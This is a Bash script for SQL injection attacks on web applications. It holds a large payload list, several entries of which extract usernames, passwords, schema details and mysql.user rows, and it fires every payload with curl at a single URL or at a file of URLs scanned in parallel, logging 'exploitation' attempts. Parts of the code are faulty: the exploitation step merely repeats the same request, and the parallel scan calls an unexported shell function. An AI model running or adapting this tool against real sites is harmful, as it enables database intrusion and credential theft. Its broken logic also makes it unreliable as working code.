#!/bin/bash

# Define log file locations and create directory
LOG_DIR="./logs"
SQLI_LOG="${LOG_DIR}/sqli_injection.log"
EXPLOIT_LOG="${LOG_DIR}/exploitation.log"

# Create log directory if it does not exist
mkdir -p "$LOG_DIR"

# Extensive list of SQL Injection payloads
SQLI_PAYLOADS=(
    # Basic Payloads
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "' OR '1'='1' #"
    "' OR 1=1--"
    "' OR 1=1/*"
    "' OR 1=1#"
    "' OR 'x'='x"
    "' OR 'a'='a"
    "' AND '1'='1'"

    # Union-Based Payloads
    "' UNION SELECT NULL, NULL, NULL--"
    "' UNION SELECT NULL, username, password FROM users--"
    "' UNION SELECT NULL, table_name, column_name FROM information_schema.columns--"
    "' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata--"
    "' UNION SELECT NULL, database(), NULL--"
    "' UNION SELECT NULL, version(), NULL--"
    "' UNION ALL SELECT NULL, NULL, NULL FROM information_schema.tables--"
    "' UNION ALL SELECT NULL, NULL, NULL FROM information_schema.columns--"
    "' UNION ALL SELECT NULL, NULL, table_schema FROM information_schema.schemata--"

    # Error-Based Payloads
    "' AND 1=CONVERT(int, (SELECT @@version))--"
    "' AND 1=CONVERT(int, (SELECT user()))--"
    "' AND 1=CONVERT(int, (SELECT database()))--"
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables LIMIT 1))--"
    "' AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns LIMIT 1))--"

    # Blind SQL Injection Payloads
    "' AND IF(1=1, SLEEP(5), 0)--"
    "' AND IF(1=1, BENCHMARK(1000000, MD5(1)), 0)--"
    "' AND IF(1=1, (SELECT COUNT(*) FROM users), 0)--"
    "' AND IF(1=1, (SELECT GROUP_CONCAT(username) FROM users), 0)--"
    "' AND IF(1=1, (SELECT CONCAT(username, ':', password) FROM users), 0)--"
    "' AND IF(1=1, (SELECT * FROM users LIMIT 1), 0)--"

    # Time-Based Payloads
    "' AND (SELECT IF(1=1, SLEEP(5), 0))--"
    "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--"
    "' AND (SELECT IF(1=1, (SELECT COUNT(*) FROM users), 0))--"

    # Boolean-Based Blind SQL Injection
    "' AND 1=1--"
    "' AND 1=2--"
    "' AND 'a'='a'--"
    "' AND 'a'='b'--"

    # Extracting Data Payloads
    "' UNION SELECT NULL, NULL, table_name FROM information_schema.tables--"
    "' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name='users'--"
    "' UNION SELECT NULL, NULL, CONCAT(username, ':', password) FROM users--"

    # Advanced Payloads
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0--"
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0--"
    "' AND (SELECT IF(1=1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables), 0))--"
    "' AND (SELECT IF(1=1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'), 0))--"

    # Common Error Message Payloads
    "' AND (SELECT 1 FROM DUAL WHERE EXISTS (SELECT * FROM users))--"
    "' AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database())--"
    "' AND (SELECT IF(1=1, (SELECT COUNT(*) FROM users), 0))--"

    # Additional Advanced Payloads
    "' AND EXISTS (SELECT * FROM information_schema.tables WHERE table_schema=database())--"
    "' AND EXISTS (SELECT * FROM information_schema.columns WHERE table_name='users')--"
    "' AND (SELECT * FROM mysql.user LIMIT 1)--"
)

# Function to perform SQL Injection testing
function sql_injection {
    local url="$1"

    echo "[*] Testing SQL Injection for $url" | tee -a "$SQLI_LOG"

    for payload in "${SQLI_PAYLOADS[@]}"; do
        echo "[*] Trying payload: $payload" | tee -a "$SQLI_LOG"

        local response
        response=$(curl -s -G "$url" --data-urlencode "param=${payload}" --user-agent "SQLiScanner/1.0" --max-time 50)

        if [[ "$response" == *"error"* || "$response" == *"Warning"* || "$response" == *"SQL"* ]]; then
            echo "[SQL Injection Detected] Payload: $payload" | tee -a "$SQLI_LOG"
            echo "URL: $url" >> "$SQLI_LOG"
            echo "Payload: $payload" >> "$SQLI_LOG"
            echo "Response: $response" >> "$SQLI_LOG"
            echo "= = = = = = = = = = = = = = = = = = = = = = = =" >> "$SQLI_LOG"

            # Attempt to exploit
            attempt_exploitation "$url" "$payload"
        else
            echo "[Not Vulnerable] URL: $url" | tee -a "$SQLI_LOG"
        fi
    done
}

# Function to attempt exploitation if a vulnerability is detected
function attempt_exploitation {
    local url="$1"
    local payload="$2"

    echo "[*] Attempting exploitation for URL: $url with payload: $payload" | tee -a "$EXPLOIT_LOG"

    # Example exploitation: Extracting database version
    local exploit_response
    exploit_response=$(curl -s -G "$url" --data-urlencode "param=${payload}" --user-agent "SQLiScanner/1.0" --max-time 50)

    if [[ "$exploit_response" == *"error"* || "$exploit_response" == *"Warning"* || "$exploit_response" == *"SQL"* ]]; then
        echo "[Exploitation Attempted] Payload: $payload" | tee -a "$EXPLOIT_LOG"
        echo "URL: $url" >> "$EXPLOIT_LOG"
        echo "Payload: $payload" >> "$EXPLOIT_LOG"
        echo "Exploit Response: $exploit_response" >> "$EXPLOIT_LOG"
        echo "= = = = = = = = = = = = = = = = = = = = = = = =" >> "$EXPLOIT_LOG"
    else
        echo "[Exploitation Not Successful] URL: $url" | tee -a "$EXPLOIT_LOG"
    fi
}

# Function for scanning a list of URLs in parallel
function scan_list {
    local url_file="$1"
    local parallel_jobs=10

    echo "[*] Scanning URLs from file: $url_file" | tee -a "$SQLI_LOG"

    parallel -j $parallel_jobs --pipepart -a "$url_file" --block 100M --line-buffer 'while IFS= read -r line; do sql_injection "$line"; done'
}

# Function for scanning a single URL
function scan_single {
    local url="$1"

    echo "[*] Scanning single URL: $url" | tee -a "$SQLI_LOG"
    sql_injection "$url"
}

# Main function to handle user input and automate scanning
function main {
    echo "Choose an option:"
    echo "1) Scan a list of URLs from a file"
    echo "2) Scan a single URL"
    read -p "Enter your choice [1/2]: " choice

    case $choice in
        1)
            read -p "Enter the file path containing URLs: " url_file
            if [[ -f "$url_file" ]]; then
                scan_list "$url_file"
            else
                echo "Error: File not found: $url_file"
                exit 1
            fi
            ;;
        2)
            read -p "Enter the URL to scan: " url
            if [[ "$url" =~ ^https?:// ]]; then
                scan_single "$url"
            else
                echo "Error: Invalid URL format."
                exit 1
            fi
            ;;
        *)
            echo "Error: Invalid choice. Exiting."
            exit 1
            ;;
    esac
}

# Run the main function
main
